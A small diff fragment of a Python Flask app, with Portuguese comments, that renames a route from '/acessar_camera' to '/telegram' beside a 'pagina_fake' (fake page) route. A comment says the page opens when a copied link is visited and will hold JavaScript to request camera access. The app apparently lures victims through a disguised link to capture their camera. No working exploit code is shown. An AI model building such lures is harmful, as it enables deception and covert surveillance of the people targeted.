@@ -31,7 +31,7 @@ def index():
 def pagina_fake():
     return render_template('pagina_fake.html')
 
-@app.route('/acessar_camera')
+@app.route('/telegram')
 def telegram():
     # Esta página será aberta quando o link copiado for acessado.
     # Ela precisará conter o JavaScript para solicitar acesso à câmera,
